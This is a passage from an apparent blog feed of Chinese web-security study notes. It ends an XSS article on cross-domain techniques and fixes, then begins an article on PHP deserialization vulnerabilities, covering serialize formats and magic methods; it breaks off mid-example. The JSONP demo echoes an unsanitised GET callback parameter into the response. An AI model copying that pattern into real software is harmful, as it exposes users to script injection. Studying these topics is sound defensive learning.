class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="comment">//得到回调函数名</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);<span class="comment">//要返回的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>).<span class="string">&#x27;)&#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​访问 <code>127.0.0.1/test.html</code> ：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/XSS/6.png"></p><p>​原理：前端 script 中的 src 请求完毕以后，后端会给前端返回一个字符串 dosomething([‘a’,’b’,’c’]) ，因为 script 标签的原因，浏览器会把这一段字符串当做 js 来执行。</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>​CORS 是 HTML5 标准提出的跨域资源共享（Cross Origin Resource Share），支持 GET、POST 等所有 HTTP 请求。CORS 需要服务器端设置 <code>Access-Control-Allow-Origin</code> 响应头，否则浏览器会因为安全策略拦截返回的信息。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*              # 允许所有域名访问</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://a.com   # 只允许a.com域名访问</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;CORS 又分为简单跨域请求和非简单跨域请求，有关 CORS 的详细介绍参考：<a href="http://www.ruanyifeng.com/blog/2016/04/cors.html">跨域资源共享 CORS 详解</a>。</p><h3 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h3><p>​<a href="https://blog.csdn.net/x550392236/article/details/79228541">通过document.domain + iframe解决跨域问题</a>。</p><h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>​JavaScript window 对象有个 name 属性，该属性有个特征，即在一个窗口（window）的生命周期内，窗口载入的所有的页面都是共享一个 window.name 的，每个页面对 window.name 都有读写的权限，window.name 是持久存在于一个窗口载入过的所有页面中的。</p><p>​<a href="https://blog.csdn.net/qq_17175013/article/details/89007334">window.name解决跨域的原理</a>。</p><h3 id="window-postMesage"><a href="#window-postMesage" class="headerlink" title="window.postMesage"></a>window.postMesage</h3><p>​通过 postMessage 来传递信息，对方可以通过监听 message 事件来监听信息。</p><p>​这里有两个页面：</p><ol><li>agent.com&#x2F;index.html</li><li>server.com&#x2F;remote.html</li></ol><p>​index.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;proxy&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://server.com/remote.html&quot;</span> <span class="attr">onload</span> = <span class="string">&quot;postMsg()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> obj = &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">msg</span>: <span class="string">&#x27;hello world&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">postMsg</span> ()&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;proxy&#x27;</span>);  </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> win = iframe.<span class="property">contentWindow</span>;  </span></span><br><span class="line"><span class="language-javascript">            win.<span class="title function_">postMessage</span>(obj, <span class="string">&#x27;http://server.com&#x27;</span>);  </span></span><br><span class="line"><span class="language-javascript">        &#125;  </span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​postMessage 的使用方法： <code>otherWindow.postMessage(message, targetOrigin);</code> 。</p><ul><li>otherWindow：其他窗口引用，是 window.frames 属性的成员或者由 window.open 方法创建的窗口。</li><li>message：要发送的消息，类型为 String、Object 。</li><li>targetOrigin：限定消息接收范围，不限制请使用 * 。</li></ul><p>​remote.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(e.<span class="property">data</span>.<span class="property">msg</span>+<span class="string">&quot; from &quot;</span>+e.<span class="property">origin</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h3><p>​利用 location.hash 来进行传值。<code>www.a.com</code>下的 a.html 想和 <code>www.b.com</code>下的 b.html 通信（在 a.html 中动态创建一个 b.html 的 iframe 来发送请求），但是由于同源策略的限制它们无法进行交流（b.html 无法返回数据），于是就找个中间人：<code>www.a.com</code>下的 c.html 。b.html 将数据传给 c.html（b.html 中创建 c.html 的 iframe），由于 c.html 和 a.html 同源，于是可通过 c.html 将返回的数据传回给 a.html ，从而达到跨域的效果。</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/XSS/7.png"></p><p>​<a href="https://blog.csdn.net/u011089760/article/details/93556961">location.hash + iframe跨域</a>。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol><li>输入过滤：<ul><li>输入是否包含非法的字符。</li><li>输入字符串是否超过最大长度的限制。</li><li>输入如果为数字，数字是否在指定的范围内。</li><li>输入是否符合特定的格式要求，如邮箱、电话号码、ip地址等。</li><li>……</li></ul></li><li>根据输入内容要插入到的位置进行相应编码。如果是放在 HTML 里，则进行 HTML 实体编码；如果是放在 JavaScript 里，则进行 JavaScript 编码……总之，要进行编码。</li><li>HttpOnly Cookie：当 Cookie 被设置为 HttpOnly 时，支持 Cookie 的浏览器将阻止客户端 JavaScript 直接访问浏览器中的 Cookie 。</li><li>Noscript：Noscript 是一款免费的开源插件，该插件默认禁止所有脚本，但可以自定义允许通过的脚本。</li><li>使用内容安全策略 CSP 。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;h2 id=&quot;演示&quot;&gt;&lt;a href=&quot;#演示&quot; class=&quot;headerlink&quot; title=&quot;演示&quot;&gt;&lt;/a&gt;演示&lt;/h2&gt;&lt;p&gt;​		</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞学习</title>
    <link href="http://example.com/2023/12/18/PHPunserialize/"/>
    <id>http://example.com/2023/12/18/PHPunserialize/</id>
    <published>2023-12-17T16:00:00.000Z</published>
    <updated>2023-12-18T06:06:34.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="序列-反序列化函数"><a href="#序列-反序列化函数" class="headerlink" title="序列&#x2F;反序列化函数"></a>序列&#x2F;反序列化函数</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h3><p>​序列化对象或数组，并返回一个字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span>;</span><br><span class="line"><span class="comment">//a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>​可进行序列化的对象：</p><table><thead><tr><th><strong>类型</strong></th><th><strong>结构</strong></th></tr></thead><tbody><tr><td>String</td><td>s:长度:”值”;</td></tr><tr><td>Integer</td><td>i:值;</td></tr><tr><td>Boolean</td><td>b:值(1或0);</td></tr><tr><td>Null</td><td>N;</td></tr><tr><td>Array</td><td>a:长度:{……}</td></tr><tr><td>Object</td><td>O:类名长度:”类名”:类中变量个数:{……}</td></tr></tbody></table><p>​Object 类型序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>=<span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>=<span class="string">&quot;male&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>();</span><br><span class="line"><span class="variable">$serialize</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:7:&quot;student&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Tom&quot;;s:6:&quot;*age&quot;;i:18;s:12:&quot;studentsex&quot;;s:4:&quot;male&quot;;&#125;</span></span><br><span class="line"><span class="comment">//注意变量对应的访问修饰符，public正常，private是%00类名%00属性名，protected是%00*%00属性名</span></span><br></pre></td></tr></table></figure><h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h3><p>​将通过 serialize() 函数序列化后的对象或数组进行反序列化，返回序列化前的内容。如果传递的字符串不可反序列化，则返回 FALSE，并产生一个 E_NOTICE。示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$unserialized_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserialized_data</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; Google</span></span><br><span class="line"><span class="comment">    [1] =&gt; Runoob</span></span><br><span class="line"><span class="comment">    [2] =&gt; Facebook</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>​构造方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">whoami</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">whoami</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;age.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Tom&quot;</span>, <span class="string">&quot;18&quot;</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Tom</span></span><br><span class="line"><span class="comment">18</span></span><br><span class="line"><span class="comment">male</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>​析构方法，在类的实例被删除时自动调用。我们可以在该方法中添加一些释放资源的操作，比如关闭文件、关闭数据库链接。</p><p>​__destruct() 是非必须的，是类的可选组成部分，通常只是用来完成对象被删除时的清理动作而已。而 PHP 的特性 「 运行完一次请求则销毁环境 」 的做法，也没必要使用 __destruct() ，反正执行完后所有该销毁的都会销毁。</p><p>​调用时机：</p><ol><li>unset($obj)</li><li>$obj &#x3D; NULL</li><li>程序自动结束</li></ol><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>​当调用 serialize() 序列化一个类的实例时，会首先检查该实例是否存在 __sleep() 方法，如果该方法存在，则自动调用，否则使用默认的序列化方式。该方法必须有返回值，返回一个数组，包含想要序列化的该实例的属性名。</p><p>​我们可以给一个类定义 __sleep() 方法来定制类的实例的序列化结果，剔除不想序列化的变量或添加想要序列化的对象。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;school = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;age&quot;</span>, <span class="string">&quot;school&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Tom&quot;</span>, <span class="string">&quot;18&quot;</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="variable">$serialize</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$student</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:7:&quot;student&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Tom&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;s:6:&quot;school&quot;;s:5:&quot;ABCDE&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>​当 unserialize() 反序列化一个类的实例成功后，会检查该实例是否存在 __wakeup() 方法，如果该方法存在，则自动调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="number">19</span>; <span class="comment">//修改年龄</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;school = <span class="string">&quot;ABCDE&quot;</span>; <span class="comment">//添加学校</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Tom&quot;</span>, <span class="string">&quot;18&quot;</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="variable">$serialize</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$student</span>);</span><br><span class="line"><span class="variable">$unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$unserialize</span>-&gt;age.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$unserialize</span>-&gt;school;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">19</span></span><br><span class="line"><span class="comment">ABCDE</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>​用于一个类的实例被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该输出什么。</p><h3 id="set-和-get"><a href="#set-和-get" class="headerlink" title="__set() 和 __get()"></a>__set() 和 __get()</h3><h3 id="isset-和-unset"><a href="#isset-和-unset" class="headerlink" title="__isset() 和 __unset()"></a>__isset() 和 __unset()</h3><p>​当对 private 变量调用 isset() 或 empty() 时，__isset() 会被调用。</p><p>​当对 private 变量调用 unset() 时，__unset() 会被调用。</p><h3 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a>__call() 和 __callStatic()</h3><p>​在非静态上下文中，当调用类的实例中的不可访问（无权限）或不存在的方法的时，将执行 __call() ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">mixed</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$arguments</span> )</span><br></pre></td></tr></table></figure><p>​在静态上下文（如欲调用的方法为静态方法）中，调用类中的不可访问（无权限）或不存在的方法时，将执行 __callStatic() ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">mixed</span> <span class="title function_ invoke__">__callStatic</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$arguments</span> )</span><br></pre></td></tr></table></figure><ul><li>string $name：要调用的方法名。</li><li>array $arguments：一个枚举数组，包含着要传递给 $name 的参数。</li></ul><p>​示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#无 __call()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$arg</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you like running, &#x27;</span> . <span class="variable">$arg</span> . <span class="string">&#x27;?&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="string">&#x27;David&#x27;</span>);</span><br><span class="line"><span class="comment">//Fatal error: Uncaught Error: Call to protected method Person::run()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#有 __call()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$arg</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you like running, &#x27;</span> . <span class="variable">$arg</span> . <span class="string">&#x27;?&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 如果类中有这个方法，就调用</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span>===<span class="string">&#x27;run&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Calling unavailable function &#x27;</span> . <span class="variable">$name</span> . <span class="string">&#x27;().&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="string">&#x27;David&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Do you like running, David?</span></span><br><span class="line"><span class="comment">Do you like running, Lily?</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">jump</span>(<span class="string">&#x27;David&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>);</span><br><span class="line"><span class="comment">//Calling unavailable function jump().</span></span><br></pre></td></tr></table></figure><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><p>​当我们创建了类的一个实例后，把这个实例当作一个方法来调用时，默认情况下， 它会抛出一个异常：</p><figure class="highlight php"><table><tr><td 